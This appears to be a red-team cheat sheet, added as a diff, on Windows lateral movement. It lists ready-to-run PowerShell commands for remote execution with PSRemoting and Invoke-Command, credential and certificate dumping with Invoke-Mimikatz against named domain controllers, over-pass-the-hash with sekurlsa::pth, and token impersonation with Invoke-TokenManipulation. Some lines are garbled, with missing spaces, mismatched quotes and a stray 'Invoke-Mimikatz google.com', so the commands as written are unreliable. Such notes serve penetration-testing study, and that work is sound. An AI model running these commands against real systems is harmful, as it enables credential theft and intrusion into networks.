@@ -1,0 +1,76 @@
+LATERAL MOVEMENT
+PSRemoting
+
+PSRemoting is enabled by default on Server 2012 onwards
+
+Enable-PSRemoting (if not enabled)
+
+
+You get elevated shell on remote system if admin creds are used to authenticate (which is the default setting)
+
+Connecting view PSRemoting
+
+New-PSSession
+
+Enter-PSSession
+
+
+Invoke-Command
+
+Use below to execute commands or semicolon separated scripts
+
+Invoke-Command –Scriptblock{Get-Process} -ComputerName(Get-Content <list_of_servers>)
+
+Use below to execute scripts from files
+
+Invoke-Command –FilePathC:\scripts\Get-PassHashes.ps1 -ComputerName(Get-Content <list_of_servers>)
+
+Mimikatz
+
+Invoke-Mimikatzuses PowerShell remoting cmdlet Invoke-Command  to do below. Thus, credentials or administrative access to the remote computers is required
+
+When Using MimiKatz, if errors recieved like "ERROR kuhl_m_sekurlsa_acquireLSA"
+
+Try doing the following command first
+
+"Invoke-Mimikatz -Command privilege::debug"
+
+Dump credentials on multiple remote machines.
+
+Invoke-Mimikatz -DumpCreds -ComputerName @(“dc01", “dc02")
+
+Dump credentials on a local machine.
+
+Invoke-Mimikatz -DumpCreds
+
+Dump certs on a local machine.
+
+Invoke-Mimikatz -DumpCerts 
+
+Invoke-Mimikatz google.com
+
+Over-pass-the-hash generate tokens from hashes
+
+Invoke-Mimikatz-Command ‘"sekurlsa::pth/user:Administrator/domain:. /ntlm:<ntlmhash> /run:powershell.exe“
+
+
+List all the tokens on a machine
+
+Invoke-TokenManipulation –ShowAll
+
+List all unique, usable tokens on the machine
+
+Invoke-TokenManipulation –enumerate
+
+
+Start a new process with token of a specific user
+
+Invoke-TokenManipulation -ImpersonateUser -Username “domain\user"
+
+Start news process with token of another process
+
+Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 550
+
+
+
+
